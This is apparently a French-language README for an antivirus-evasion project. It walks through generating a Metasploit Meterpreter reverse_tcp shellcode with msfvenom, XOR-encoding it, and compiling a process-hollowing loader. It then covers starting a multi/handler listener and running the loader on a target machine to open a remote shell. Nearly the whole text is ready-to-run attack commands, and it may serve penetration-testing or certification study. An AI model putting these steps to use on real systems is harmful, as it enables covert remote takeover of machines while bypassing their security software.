# Bypass-AV-ProcessHollowing



Ce projet est basé sur le dépôt Github de chvancooten :
https://github.com/chvancooten/OSEP-Code-Snippets





#Utilisation :

Générer un meterpreter Metasploit sous la forme d'un shellcode avec msfvenom :
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SERVER> LPORT=<PORT> -f csharp


Créer un nouveau projet DotNet dans Visual Studio Code :
dotnet new console


Remplacer le contenu de Program.cs par le contenu du fichier XorCipher.cs et remplacer le shellcode par celui généré avec msfvenom


Générer la solution sous la forme d'un fichier PE avec ses librairies embarquée :
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true


Exécuter le fichier compilé dans une invite de commande :
.\XorCipher.exe


Créer un second projet DotNet dans une autre instance de Visual Studio Code :
dotnet new console


Remplacer le contenu de Program.cs par le contenu du fichier ProcessHollowing.cs et remplacer le shellcode par celui généré avec XorCipher.exe


Générer la solution sous la forme d'un fichier PE avec ses librairies embarquée :
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true


Lancer un listener dans la console metasploit :
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <SERVER>
set lport <PORT>
exploit


Exécuter le fichier ProcessHollowing.exe sur le poste cible puis savourer un délicieux cookie aux pépites de chocolat :)
